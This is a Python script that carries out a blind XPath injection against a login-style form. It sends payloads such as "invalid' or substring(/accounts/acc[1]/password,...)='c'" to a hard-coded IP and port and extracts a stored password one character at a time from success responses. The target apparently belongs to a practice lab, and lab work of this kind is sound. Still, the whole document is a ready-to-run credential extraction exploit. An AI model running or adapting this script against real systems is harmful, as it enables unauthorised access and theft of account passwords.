import requests
import string
import time

def extract_success(response_text):
    return 'alert("Message successfully sent!")' in response_text

def extract_password(url):
    password = ""
    max_length = 37
    chars = string.ascii_letters + string.digits + string.punctuation
    
    print("Starting password extraction...")
    print("-" * 50)
    
    # Try positions from 1 to 37
    for position in range(1, max_length + 1):
        print(f"\nTesting position {position}")
        
        # Try each character
        for char in chars:
            payload = {
                'username': f"invalid' or substring(/accounts/acc[1]/password,{position},1)='{char}' and '1'='1",
                'msg': 'test'
            }
            
            try:
                response = requests.post(url, data=payload)
                
                print(f"Testing character: {char}", end='\r')
                
                if extract_success(response.text):
                    password += char
                    print(f"\nFound character at position {position}: {char}")
                    print(f"Password so far: {password}")
                    break
                
                time.sleep(0.1)  # Small delay to avoid overwhelming the server
                
            except Exception as e:
                print(f"\nError occurred: {str(e)}")
                continue
    
    return password

def main():
    url = "http://83.136.253.28:46101/index.php"
    
    print("Starting password exfiltration...")
    print(f"Target URL: {url}")
    print("-" * 50)
    
    password = extract_password(url)
    
    print("\n" + "=" * 50)
    print("Extraction complete!")
    print(f"Final password: {password}")
    print("Length:", len(password))
    print("=" * 50)

if __name__ == "__main__":
    main()